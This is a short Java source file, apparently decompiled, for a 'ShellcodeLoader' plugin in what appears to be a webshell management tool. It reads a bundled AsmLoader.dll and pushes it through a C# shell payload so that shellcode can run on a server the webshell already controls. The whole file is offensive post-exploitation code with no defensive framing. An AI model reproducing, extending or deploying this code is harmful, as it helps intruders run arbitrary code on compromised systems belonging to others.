package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import shells.plugins.generic.ShellcodeLoader;
import util.Log;
import util.functions;
























@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "ShellcodeLoader", DisplayName = "ShellcodeLoader")
public class ShellcodeLoader
  extends ShellcodeLoader
{
  private static final String CLASS_NAME = "AsmLoader.Run";
  
  public boolean load() {
    if (!this.loadState) {
      try {
        InputStream inputStream = getClass().getResourceAsStream("assets/AsmLoader.dll");
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        if (this.payload.include("AsmLoader.Run", data)) {
          this.loadState = true;
          GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
        } else {
          GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
        } 
      } catch (Exception e) {
        Log.error(e);
        GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
      } 
    }
    
    return this.loadState;
  }

  
  public String getClassName() {
    return "AsmLoader.Run";
  }
}
